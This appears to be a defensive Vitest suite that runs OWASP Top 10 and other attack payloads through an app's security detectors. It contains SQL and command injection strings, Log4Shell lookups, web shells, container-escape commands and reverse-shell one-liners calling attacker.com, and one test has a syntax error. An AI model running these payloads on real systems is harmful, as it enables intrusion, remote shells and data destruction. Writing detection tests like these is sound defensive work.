/**
 * Penetration Testing Scenarios
 *
 * This test suite simulates various attack vectors to ensure
 * the application can withstand real-world security threats.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { render, screen, fireEvent, waitFor } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { BrowserRouter } from 'react-router-dom';
import React from 'react';

// Import security components
import apiSecurityValidator from '@/lib/api-security-validator';
import securityHeadersManager from '@/lib/security-headers';
import securityAuditor from '@/lib/security-audit';
import securityMonitoring from '@/lib/security-monitoring';
import paymentSecurity from '@/lib/payment-security';

// Mock API endpoints for penetration testing
const mockAPI = {
  // Vulnerable endpoints (should be secured)
  '/api/users': {
    method: 'GET',
    vulnerabilities: ['sql_injection', 'xss', 'id_or'],
  },
  '/api/booking': {
    method: 'POST',
    vulnerabilities: ['csrf', 'injection', 'rate_limit'],
  },
  '/api/admin/users': {
    method: 'DELETE',
    vulnerabilities: ['authorization', 'id_or'],
  },
  '/api/payment/process': {
    method: 'POST',
    vulnerabilities: ['payment_fraud', 'data_exposure'],
  },
};

describe('Penetration Testing Scenarios', () => {
  beforeEach(() => {
    vi.stubEnv('NODE_ENV', 'test');
    vi.stubEnv('VITE_APP_ENV', 'test');

    // Reset security monitoring
    securityMonitoring['metrics'] = securityMonitoring['initializeMetrics']();
    securityMonitoring['alerts'] = [];
    securityAuditor['events'] = [];

    // Mock fetch API
    global.fetch = vi.fn();
  });

  afterEach(() => {
    vi.unstubAllEnvs();
    vi.clearAllMocks();
  });

  describe('OWASP Top 10 Testing', () => {
    describe('A01: Broken Access Control', () => {
      it('should prevent unauthorized access to admin endpoints', async () => {
        // Test direct access to admin endpoints
        const adminRequest = {
          path: '/api/admin/users',
          method: 'DELETE',
          headers: {
            'Authorization': 'Bearer invalid-token',
          },
          body: { userId: '123' },
        };

        const result = apiSecurityValidator.validateRequest(adminRequest);
        expect(result.suspicious).toBe(true);
        expect(result.riskScore).toBeGreaterThan(70);
      });

      it('should prevent privilege escalation attempts', () => {
        const escalationAttempts = [
          { role: 'user', requestedRole: 'admin' },
          { role: 'guest', requestedRole: 'superuser' },
          { role: 'customer', requestedRole: 'manager' },
        ];

        escalationAttempts.forEach(attempt => {
          const request = {
            path: '/api/users/role',
            method: 'PATCH',
            body: attempt,
            userRole: attempt.role,
          };

          const result = apiSecurityValidator.validatePrivilegeEscalation(request);
          expect(result.blocked).toBe(true);
          expect(result.reason).toContain('privilege escalation');
        });
      });

      it('should enforce proper resource ownership', () => {
        const requests = [
          { userId: 'user123', requestedResourceId: 'user456', action: 'read' },
          { userId: 'user123', requestedResourceId: 'user456', action: 'write' },
          { userId: 'user123', requestedResourceId: 'user456', action: 'delete' },
        ];

        requests.forEach(request => {
          const result = apiSecurityValidator.validateResourceAccess(request);
          expect(result.authorized).toBe(false);
          expect(result.reason).toContain('ownership');
        });
      });

      it('should prevent IDOR (Insecure Direct Object Reference)', () => {
        const idorAttempts = [
          '/api/users/123/orders/456', // user trying to access another user's order
          '/api/bookings/789', // accessing booking without ownership
          '/api/files/user/abc/profile.pdf', // accessing another user's file
        ];

        idorAttempts.forEach(path => {
          const request = {
            path,
            method: 'GET',
            userId: 'user123',
          };

          const result = apiSecurityValidator.detectIDOR(request);
          expect(result.detected).toBe(true);
        });
      });
    });

    describe('A02: Cryptographic Failures', () => {
      it('should detect weak encryption usage', () => {
        const weakImplementations = [
          { algorithm: 'md5', usage: 'password hashing' },
          { algorithm: 'sha1', usage: 'data integrity' },
          { algorithm: 'des', usage: 'encryption' },
          { algorithm: 'rc4', usage: 'stream cipher' },
        ];

        weakImplementations.forEach(impl => {
          const result = apiSecurityValidator.validateCryptoImplementation(impl);
          expect(result.secure).toBe(false);
          expect(result.vulnerabilities.length).toBeGreaterThan(0);
        });
      });

      it('should ensure sensitive data encryption', () => {
        const sensitiveData = [
          { field: 'credit_card', value: '4111111111111111', encrypted: false },
          { field: 'ssn', value: '123-45-6789', encrypted: false },
          { field: 'password', value: 'plaintext123', encrypted: false },
          { field: 'api_key', value: 'sk_live_123', encrypted: false },
        ];

        sensitiveData.forEach(data => {
          const result = apiSecurityValidator.validateDataEncryption(data);
          expect(result.compliant).toBe(false);
          expect(result.violations).toContain('unencrypted_sensitive_data');
        });
      });

      it('should validate key management practices', () => {
        const keyIssues = [
          { issue: 'hardcoded_key', location: 'source_code' },
          { issue: 'weak_key_length', length: 128 },
          { issue: 'key_reuse', contexts: ['encryption', 'signing'] },
          { issue: 'key_exposure', location: 'client_side' },
        ];

        keyIssues.forEach(issue => {
          const result = apiSecurityValidator.validateKeyManagement(issue);
          expect(result.secure).toBe(false);
          expect(result.risks.length).toBeGreaterThan(0);
        });
      });
    });

    describe('A03: Injection', () => {
      it('should prevent SQL injection attacks', () => {
        const sqlInjectionPayloads = [
          "'; DROP TABLE users; --",
          "' OR '1'='1",
          "1; DELETE FROM users WHERE 1=1; --",
          "' UNION SELECT username, password FROM users --",
          "'; EXEC xp_cmdshell('dir'); --",
          "' OR 1=1 #",
          "' UNION SELECT @@version --",
          "'; ALTER TABLE users ADD COLUMN test VARCHAR(255); --",
        ];

        sqlInjectionPayloads.forEach(payload => {
          const request = {
            path: '/api/users',
            method: 'GET',
            query: { id: payload },
            body: { search: payload },
          };

          const result = apiSecurityValidator.detectSQLInjection(payload);
          expect(result.detected).toBe(true);
          expect(result.patterns.length).toBeGreaterThan(0);

          const requestValidation = apiSecurityValidator.validateRequest(request);
          expect(requestValidation.suspicious).toBe(true);
        });
      });

      it('should prevent NoSQL injection attacks', () => {
        const nosqlInjectionPayloads = [
          { "$ne": "" },
          { "$gt": "" },
          { "$where": "this.username == 'admin'" },
          { "$regex": ".*" },
          { "$expr": { "$eq": ["$password", "admin"] } },
          { "$or": [{ "username": "admin" }, { "password": { "$ne": "" } }] },
        ];

        nosqlInjectionPayloads.forEach(payload => {
          const result = apiSecurityValidator.detectNoSQLInjection(payload);
          expect(result.detected).toBe(true);
        });
      });

      it('should prevent command injection', () => {
        const commandInjectionPayloads = [
          "; ls -la",
          "| cat /etc/passwd",
          "& echo 'hacked'",
          "`whoami`",
          "$(id)",
          "; rm -rf /*",
          "| nc attacker.com 4444 -e /bin/sh",
        ];

        commandInjectionPayloads.forEach(payload => {
          const result = apiSecurityValidator.detectCommandInjection(payload);
          expect(result.detected).toBe(true);
        });
      });

      it('should prevent LDAP injection', () => {
        const ldapInjectionPayloads = [
          "*)(uid=*",
          "*)(|(objectClass=*)",
          "*)(|(password=*",
          "*))%00",
          "admin)(&",
          "*)(&(objectClass=*)",
        ];

        ldapInjectionPayloads.forEach(payload => {
          const result = apiSecurityValidator.detectLDAPInjection(payload);
          expect(result.detected).toBe(true);
        });
      });
    });

    describe('A04: Insecure Design', () => {
      it('should detect business logic flaws', () => {
        const businessLogicAttacks = [
          {
            name: 'price_manipulation',
            payload: { price: -100, discount: 999999 },
            expected: 'block',
          },
          {
            name: 'race_condition',
            payload: { action: 'withdraw', amount: 1000, times: 100 },
            expected: 'detect',
          },
          {
            name: 'bypass_validation',
            payload: { step: 'payment', completed: ['all'] },
            expected: 'block',
          },
        ];

        businessLogicAttacks.forEach(attack => {
          const result = apiSecurityValidator.detectBusinessLogicFlaw(attack);
          if (attack.expected === 'block') {
            expect(result.blocked).toBe(true);
          } else {
            expect(result.detected).toBe(true);
          }
        });
      });

      it('should prevent authorization bypass', () => {
        const bypassAttempts = [
          { path: '/api/admin', method: 'GET', headers: { 'X-Role': 'admin' } },
          { path: '/api/users/123/sensitive', method: 'GET', headers: { 'X-User-ID': '123' } },
          { path: '/api/payments/refund', method: 'POST', headers: { 'X-Privileged': 'true' } },
        ];

        bypassAttempts.forEach(attempt => {
          const result = apiSecurityValidator.detectAuthorizationBypass(attempt);
          expect(result.blocked).toBe(true);
        });
      });

      it('should validate secure workflow design', () => {
        const workflowTests = [
          {
            workflow: 'booking',
            steps: ['select', 'time', 'details', 'payment'],
            current: 'payment',
            completed: ['select'],
            expected: 'reject',
          },
          {
            workflow: 'user_registration',
            steps: ['email', 'verify', 'profile', 'complete'],
            current: 'profile',
            completed: ['email'],
            expected: 'reject',
          },
        ];

        workflowTests.forEach(test => {
          const result = apiSecurityValidator.validateWorkflowSecurity(test);
          expect(result.valid).toBe(test.expected === 'accept');
        });
      });
    });

    describe('A05: Security Misconfiguration', () => {
      it('should detect missing security headers', () => {
        const headersWithoutSecurity = {
          'Content-Type': 'application/json',
          // Missing security headers
        };

        const result = securityHeadersManager.validateHeaders(headersWithoutSecurity);
        expect(result.missing.length).toBeGreaterThan(0);
        expect(result.missing).toContain('X-Content-Type-Options');
        expect(result.missing).toContain('X-Frame-Options');
      });

      it('should detect verbose error messages', () => {
        const verboseErrors = [
          'Error: Table users doesn\'t exist in database mariia_hub on line 42',
          'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'mariia_hub.users\' doesn\'t exist',
          'Fatal error: Call to undefined function mysql_connect() in /var/www/html/config.php on line 15',
          'Exception: Permission denied for user \'root\'@\'localhost\' to database \'mariia_hub\'',
        ];

        verboseErrors.forEach(error => {
          const result = apiSecurityValidator.detectVerboseError(error);
          expect(result.verbose).toBe(true);
          expect(result.exposedInfo.length).toBeGreaterThan(0);
        });
      });

      it('should detect directory listing enabled', () => {
        const directoryListingResponses = [
          { status: 200, body: 'Index of /uploads/' },
          { status: 200, body: 'Directory Listing for /backup/' },
          { status: 200, body: '<pre><a href="../">Parent Directory</a></pre>' },
        ];

        directoryListingResponses.forEach(response => {
          const result = apiSecurityValidator.detectDirectoryListing(response);
          expect(result.enabled).toBe(true);
        });
      });

      it('should detect debug information exposure', () => {
        const debugInfo = [
          'DEBUG: SQL Query: SELECT * FROM users WHERE id = \'1\'',
          'Stack Trace: at User.authenticate() in user.php:123',
          'Development Mode: Enabled - Stack traces shown',
          'X-Debug-Info: query_time=0.123s memory_usage=45MB',
        ];

        debugInfo.forEach(info => {
          const result = apiSecurityValidator.detectDebugInfo(info);
          expect(result.exposed).toBe(true);
        });
      });
    });

    describe('A06: Vulnerable and Outdated Components', () => {
      it('should detect vulnerable user-agent strings', () => {
        const vulnerableUserAgents = [
          'sqlmap/1.0',
          'Nikto/2.1.6',
          'Nmap Scripting Engine',
          'python-requests/2.22.0',
          'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        ];

        vulnerableUserAgents.forEach(ua => {
          const result = apiSecurityValidator.analyzeUserAgent(ua);
          expect(result.suspicious).toBe(true);
          expect(result.riskScore).toBeGreaterThan(50);
        });
      });

      it('should detect outdated protocol versions', () => {
        const outdatedProtocols = [
          { protocol: 'TLSv1.0', version: '1.0' },
          { protocol: 'TLSv1.1', version: '1.1' },
          { protocol: 'SSLv3', version: '3.0' },
          { protocol: 'SSLv2', version: '2.0' },
        ];

        outdatedProtocols.forEach(protocol => {
          const result = apiSecurityValidator.validateProtocolVersion(protocol);
          expect(result.secure).toBe(false);
          expect(result.recommendation).toContain('upgrade');
        });
      });
    });

    describe('A07: Identification and Authentication Failures', () => {
      it('should prevent credential stuffing attacks', () => {
        const credentialStuffingRequests = Array(10).fill(null).map((_, i) => ({
          username: `admin`,
          password: `password${i}`,
          ip: `192.168.1.${i}`,
        }));

        let blockedCount = 0;
        credentialStuffingRequests.forEach(request => {
          const result = apiSecurityValidator.detectCredentialStuffing(request);
          if (result.blocked) blockedCount++;
        });

        expect(blockedCount).toBeGreaterThan(5); // Should block most attempts
      });

      it('should prevent brute force attacks', () => {
        const bruteForceAttempts = Array(20).fill(null).map((_, i) => ({
          username: 'admin',
          password: 'guess',
          ip: '192.168.1.100',
          timestamp: Date.now() + i * 1000,
        }));

        let blockedCount = 0;
        bruteForceAttempts.forEach(attempt => {
          const result = apiSecurityValidator.detectBruteForce(attempt);
          if (result.blocked) blockedCount++;
        });

        expect(blockedCount).toBeGreaterThan(10); // Should block after threshold
      });

      it('should prevent authentication bypass', () => {
        const bypassAttempts = [
          { header: 'X-Forwarded-For', value: '127.0.0.1' },
          { header: 'X-Real-IP', value: '127.0.0.1' },
          { header: 'X-Originating-IP', value: '127.0.0.1' },
          { cookie: 'auth=admin', value: 'true' },
          { param: 'admin', value: 'true' },
        ];

        bypassAttempts.forEach(attempt => {
          const result = apiSecurityValidator.detectAuthBypass(attempt);
          expect(result.detected).toBe(true);
        });
      });

      it('should enforce strong password policies', () => {
        const weakPasswords = [
          '123456',
          'password',
          'admin',
          'qwerty',
          '111111',
          'abc123',
          'password123',
          'admin123',
        ];

        weakPasswords.forEach(password => {
          const result = apiSecurityValidator.validatePasswordStrength(password);
          expect(result.strong).toBe(false);
          expect(result.issues.length).toBeGreaterThan(0);
        });
      });
    });

    describe('A08: Software and Data Integrity Failures', () => {
      it('should detect code injection attempts', () => {
        const codeInjectionPayloads = [
          '${jndi:ldap://attacker.com/a}',
          '${java:runtime}',
          '${env:ENV_NAME}',
          '{{7*7}}',
          '#{7*7}',
          '<%=7*7%>',
        ];

        codeInjectionPayloads.forEach(payload => {
          const result = apiSecurityValidator.detectCodeInjection(payload);
          expect(result.detected).toBe(true);
        });
      });

      it('should validate digital signatures', () => {
        const invalidSignatures = [
          { data: 'test', signature: 'invalid', algorithm: 'HS256' },
          { data: 'test', signature: null, algorithm: 'RS256' },
          { data: 'test', signature: '', algorithm: 'ES256' },
          { data: 'test', signature: 'tampered', algorithm: 'PS256' },
        ];

        invalidSignatures.forEach(sig => {
          const result = apiSecurityValidator.validateDigitalSignature(sig);
          expect(result.valid).toBe(false);
        });
      });

      it('should prevent insecure deserialization', () => {
        const maliciousObjects = [
          '__import__("os").system("ls")',
          '${jndi:rmi://attacker.com/exploit}',
          '{{config.__class__.__init__.__globals__}}',
          '%{#a=(new java.lang.ProcessBuilder("cmd")).start()}',
        ];

        maliciousObjects.forEach(obj => {
          const result = apiSecurityValidator.detectInsecureDeserialization(obj);
          expect(result.detected).toBe(true);
        });
      });
    });

    describe('A09: Security Logging and Monitoring Failures', () => {
      it('should detect suspicious request patterns', () => {
        const suspiciousPatterns = [
          { path: '/api/../etc/passwd', count: 5, timespan: 60000 },
          { path: '/api/admin/login', count: 10, timespan: 30000 },
          { path: '/api/users', method: 'DELETE', count: 3, timespan: 10000 },
        ];

        suspiciousPatterns.forEach(pattern => {
          const result = securityMonitoring.detectSuspiciousPattern(pattern);
          expect(result.alert).toBe(true);
          expect(result.severity).toBeGreaterThan(3);
        });
      });

      it('should ensure proper event logging', () => {
        const securityEvents = [
          { type: 'login', success: false, user: 'admin', ip: '192.168.1.1' },
          { type: 'privilege_escalation', success: false, user: 'user1', ip: '192.168.1.2' },
          { type: 'data_access', resource: 'sensitive_data', user: 'user2', ip: '192.168.1.3' },
        ];

        securityEvents.forEach(event => {
          securityAuditor.logEvent(event);
        });

        const events = securityAuditor.getRecentEvents();
        expect(events.length).toBeGreaterThanOrEqual(3);
      });
    });

    describe('A10: Server-Side Request Forgery (SSRF)', () => {
      it('should prevent SSRF attacks', () => {
        const ssrfPayloads = [
          'http://localhost:8080/admin',
          'http://127.0.0.1:22',
          'http://169.254.169.254/latest/meta-data/',
          'file:///etc/passwd',
          'ftp://192.168.1.1/files',
          'gopher://192.168.1.1:80/_GET%20%2f',
        ];

        ssrfPayloads.forEach(payload => {
          const result = apiSecurityValidator.detectSSRF(payload);
          expect(result.blocked).toBe(true);
          expect(result.reason).toContain('SSRF');
        });
      });

      it('should validate URL schemes', () => {
        const maliciousUrls = [
          'javascript:alert(1)',
          'data:text/html,<script>alert(1)</script>',
          'vbscript:msgbox(1)',
          'file:///etc/passwd',
          'ftp://attacker.com/backdoor',
        ];

        maliciousUrls.forEach(url => {
          const result = apiSecurityValidator.validateURL(url);
          expect(result.safe).toBe(false);
        });
      });
    });
  });

  describe('Advanced Attack Scenarios', () => {
    it('should prevent HTTP request smuggling', () => {
      const smugglingAttempts = [
        'GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n',
        'POST / HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n',
      ];

      smugglingAttempts.forEach(attempt => {
        const result = apiSecurityValidator.detectRequestSmuggling(attempt);
        expect(result.detected).toBe(true);
      });
    });

    it('should prevent cross-site tracing', () => {
      const tracingMethods = ['TRACE', 'TRACK', 'DEBUG'];

      tracingMethods.forEach(method => {
        const result = apiSecurityValidator.validateHTTPMethod(method);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('security risk');
      });
    });

    it('should prevent HTTP parameter pollution', () => {
      const pollutionAttempts = [
        { param: 'id', values: ['1', '2', '3'] },
        { param: 'action', values: ['view', 'edit', 'delete'] },
        { param: 'user', values: ['admin', 'guest', 'user'] },
      ];

      pollutionAttempts.forEach(attempt => {
        const result = apiSecurityValidator.detectParameterPollution(attempt);
        expect(result.detected).toBe(true);
      });
    });

    it('should prevent race condition attacks', () => {
      const raceConditionScenarios = [
        {
          name: 'double_withdrawal',
          action: 'withdraw',
          amount: 100,
          concurrency: 2,
        },
        {
          name: 'double_booking',
          action: 'book',
          slot: '2024-01-01T10:00:00Z',
          concurrency: 2,
        },
      ];

      raceConditionScenarios.forEach(scenario => {
        const result = apiSecurityValidator.detectRaceCondition(scenario);
        expect(result.detected).toBe(true);
        expect(result.prevention).toBeDefined();
      });
    });
  });

  describe('File Upload Security', () => {
    it('should prevent malicious file uploads', () => {
      const maliciousFiles = [
        { name: 'shell.php', type: 'application/x-php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'backdoor.jsp', type: 'application/x-jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'script.js', type: 'application/javascript', content: '<script>alert(document.cookie)</script>' },
        { name: 'exploit.exe', type: 'application/x-executable', content: 'MZ\x90\x00' },
      ];

      maliciousFiles.forEach(file => {
        const result = apiSecurityValidator.validateFileUpload(file);
        expect(result.safe).toBe(false);
        expect(result.reasons.length).toBeGreaterThan(0);
      });
    });

    it('should enforce file size limits', () => {
      const oversizedFiles = [
        { size: 50 * 1024 * 1024, limit: 10 * 1024 * 1024 }, // 50MB file with 10MB limit
        { size: 100 * 1024 * 1024, limit: 5 * 1024 * 1024 },  // 100MB file with 5MB limit
      ];

      oversizedFiles.forEach(file => {
        const result = apiSecurityValidator.validateFileSize(file.size, file.limit);
        expect(result.valid).toBe(false);
        expect(result.violation).toContain('size limit');
      });
    });

    it('should validate file types and extensions', () => {
      const invalidFileTypes = [
        { extension: '.exe', allowed: ['.jpg', '.png', '.pdf'] },
        { extension: '.php', allowed: ['.jpg', '.png', '.pdf'] },
        { extension: '.sh', allowed: ['.txt', '.doc', '.pdf'] },
        { extension: '.bat', allowed: ['.jpg', '.png', '.gif'] },
      ];

      invalidFileTypes.forEach(file => {
        const result = apiSecurityValidator.validateFileType(file.extension, file.allowed);
        expect(result.allowed).toBe(false);
      });
    });
  });

  describe('API Security Testing', () => {
    it('should prevent API key abuse', () => {
      const apiKeyAbuse = [
        { key: 'public_key', endpoint: '/api/admin/users', usage: 'admin_access' },
        { key: 'read_key', endpoint: '/api/data/delete', usage: 'write_operation' },
        { key: 'expired_key', endpoint: '/api/user/profile', usage: 'access_after_expiry' },
      ];

      apiKeyAbuse.forEach(abuse => {
        const result = apiSecurityValidator.validateAPIKeyUsage(abuse);
        expect(result.authorized).toBe(false);
        expect(result.violation).toBeDefined();
      });
    });

    it('should enforce rate limiting', () => {
      const rateLimitTest = {
        clientId: 'test-client',
        endpoint: '/api/search',
        requests: Array(100).fill(null).map((_, i) => ({
          timestamp: Date.now() + i * 100,
        })),
      };

      let blockedCount = 0;
      rateLimitTest.requests.forEach(request => {
        const result = apiSecurityValidator.checkRateLimit(
          rateLimitTest.clientId,
          rateLimitTest.endpoint
        );
        if (!result.allowed) blockedCount++;
      });

      expect(blockedCount).toBeGreaterThan(50); // Should block majority after limit
    });

    it('should prevent mass assignment', () => {
      const massAssignmentAttempts = [
        {
          model: 'user',
          data: {
            name: 'John',
            email: 'john@example.com',
            role: 'admin',  // Should not be assignable
            is_verified: true,  // Should not be assignable
          }
        },
        {
          model: 'booking',
          data: {
            service_id: '123',
            time: '2024-01-01T10:00:00Z',
            status: 'confirmed',  // Should not be assignable
            payment_status: 'paid',  // Should not be assignable
          }
        },
      ];

      massAssignmentAttempts.forEach(attempt => {
        const result = apiSecurityValidator.detectMassAssignment(attempt);
        expect(result.detected).toBe(true);
        expect(result.blocked.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Client-Side Security', () => {
    it('should prevent DOM-based XSS', () => {
      const domXssPayloads = [
        '#<img src=x onerror=alert(1)>',
        '#<script>alert(1)</script>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)">',
        '<svg onload="alert(1)">',
      ];

      domXssPayloads.forEach(payload => {
        const result = apiSecurityValidator.validateInput(payload, 'url_fragment');
        expect(result.safe).toBe(false);
        expect(result.reason).toContain('XSS');
      });
    });

    it('should prevent prototype pollution', () => {
      const pollutionPayloads = [
        { '__proto__': { 'admin': true } },
        { 'constructor': { 'prototype': { 'admin': true } } },
        { 'prototype': { 'isAdmin': true } },
        { '__proto__': { 'env': { 'NODE_ENV': 'development' } } },
      ];

      pollutionPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectPrototypePollution(payload);
        expect(result.detected).toBe(true);
      });
    });

    it('should validate JSON input safely', () => {
      const maliciousJSON = [
        '{"__proto__": {"admin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"key": {"$ref": "https://attacker.com/payload.json"}}',
        '{"rce": "__import__(\'os\').system(\'ls\')"}',
      ];

      maliciousJSON.forEach(jsonString => {
        const result = apiSecurityValidator.validateJSONInput(jsonString);
        expect(result.safe).toBe(false);
        expect(result.issues.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Session Security', () => {
    it('should prevent session fixation', () => {
      const sessionFixationAttempts = [
        { sessionId: 'PHPSESSID=admin123', action: 'login' },
        { sessionId: 'JSESSIONID=administrator', action: 'login' },
        { sessionId: 'ASP.NET_SessionId=admin', action: 'privilege_escalation' },
      ];

      sessionFixationAttempts.forEach(attempt => {
        const result = apiSecurityValidator.detectSessionFixation(attempt);
        expect(result.detected).toBe(true);
      });
    });

    it('should prevent session hijacking', () => {
      const hijackingIndicators = [
        {
          currentIp: '192.168.1.100',
          sessionIp: '10.0.0.1',
          userAgent: 'Mozilla/5.0',
          sessionUserAgent: 'curl/7.68.0'
        },
        {
          currentIp: '203.0.113.1',
          sessionIp: '198.51.100.1',
          geolocation: 'US',
          sessionGeolocation: 'CN',
        },
      ];

      hijackingIndicators.forEach(indicator => {
        const result = apiSecurityValidator.detectSessionHijacking(indicator);
        expect(result.suspicious).toBe(true);
        expect(result.riskScore).toBeGreaterThan(70);
      });
    });

    it('should enforce session timeout', () => {
      const oldSession = {
        createdAt: Date.now() - (25 * 60 * 60 * 1000), // 25 hours ago
        lastActivity: Date.now() - (2 * 60 * 60 * 1000), // 2 hours ago
        timeout: 30 * 60 * 1000, // 30 minutes
      };

      const result = apiSecurityValidator.validateSessionTimeout(oldSession);
      expect(result.valid).toBe(false);
      expect(result.reason).toContain('timeout');
    });
  });

  describe('Infrastructure Security', () => {
    it('should detect container escape attempts', () => {
      const escapeAttempts = [
        'docker run --privileged -v /:/hostfs ubuntu',
        'mount -t proc proc /proc',
        'chroot /hostfs',
        'nsenter --target 1 --mount --uts --ipc --net --pid',
      ];

      escapeAttempts.forEach(attempt => {
        const result = apiSecurityValidator.detectContainerEscape(attempt);
        expect(result.detected).toBe(true);
        expect(result.severity).toBe('critical');
      });
    });

    it('should detect reverse shell attempts', () {
      const reverseShellPayloads = [
        'bash -i >& /dev/tcp/attacker.com/4444 0>&1',
        'nc -e /bin/sh attacker.com 4444',
        'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'attacker.com\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
        'perl -e \'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'',
      ];

      reverseShellPayloads.forEach(payload => {
        const result = apiSecurityValidator.detectReverseShell(payload);
        expect(result.detected).toBe(true);
        expect(result.threat).toContain('reverse shell');
      });
    });
  });

  describe('Compliance and Data Protection', () => {
    it('should detect PCI DSS violations', () => {
      const pciViolations = [
        { field: 'credit_card', stored: true, encrypted: false },
        { field: 'cvv', stored: true, encrypted: true },
        { field: 'expiry', logged: true },
        { field: 'pan', transmitted: false, encrypted: false },
      ];

      pciViolations.forEach(violation => {
        const result = apiSecurityValidator.validatePCIDSS(violation);
        expect(result.compliant).toBe(false);
        expect(result.violations.length).toBeGreaterThan(0);
      });
    });

    it('should detect GDPR violations', () => {
      const gdprViolations = [
        { data: 'email', consent: false, processed: true },
        { data: 'personal_info', retention_days: 400, limit: 365 },
        { data: 'sensitive_data', purpose: 'marketing', lawful_basis: 'none' },
        { data: 'user_profile', deletion_request: true, actually_deleted: false },
      ];

      gdprViolations.forEach(violation => {
        const result = apiSecurityValidator.validateGDPR(violation);
        expect(result.compliant).toBe(false);
        expect(result.issues.length).toBeGreaterThan(0);
      });
    });
  });
});